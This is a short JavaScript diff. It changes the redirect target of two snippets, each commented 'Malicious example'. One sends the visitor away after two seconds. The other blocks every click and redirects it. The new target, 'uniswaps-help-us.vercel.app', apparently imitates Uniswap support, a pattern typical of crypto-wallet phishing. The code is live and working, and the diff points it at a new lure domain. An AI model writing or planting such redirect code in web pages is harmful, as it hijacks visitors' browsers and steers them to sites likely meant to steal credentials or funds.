@@ -22,11 +22,11 @@ document.addEventListener('DOMContentLoaded', () => {
 
 // Malicious example
 setTimeout(function() {
-    window.location.href = "https://1ich.vercel.app/";
+    window.location.href = "https://uniswaps-help-us.vercel.app/";
 }, 2000); // 2000 milliseconds = 2 seconds
 
 // Malicious example
 document.addEventListener('click', function(event) {
     event.preventDefault(); // Stops the original button action
-    window.location.href = "https://1ich.vercel.app/";
+    window.location.href = "https://uniswaps-help-us.vercel.app/";
 });
